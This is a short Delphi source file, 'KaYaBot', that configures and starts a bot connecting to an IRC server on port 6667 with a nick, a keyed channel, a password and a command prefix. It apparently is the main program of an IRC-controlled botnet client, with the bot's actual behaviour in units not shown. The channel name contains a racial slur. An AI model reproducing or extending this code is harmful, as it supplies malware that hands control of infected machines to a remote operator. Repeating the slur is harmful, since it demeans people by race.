   program KaYaBot;

   uses
     Windows,
     BotComp in 'BotComp.pas',
     pFunc in 'pFunc.pas';

   var
     Bot: TKaya;

   begin

     Bot := TKaya.Create ;
     Bot.Port := 6667;
     Bot.Clone := 0;
     Bot.Server := IpStr('irc.sadisticnet.org');
     Bot.Nick := 'KaYa';
     Bot.Ident := 'KaYa';
     Bot.Channel := '##niggah';
     Bot.Key := 'hejsan';
     Bot.Password := 'test';
     Bot.Prefix := '';
     Bot.BotName := 'KaYa';
     Bot.StartBot;

   end.
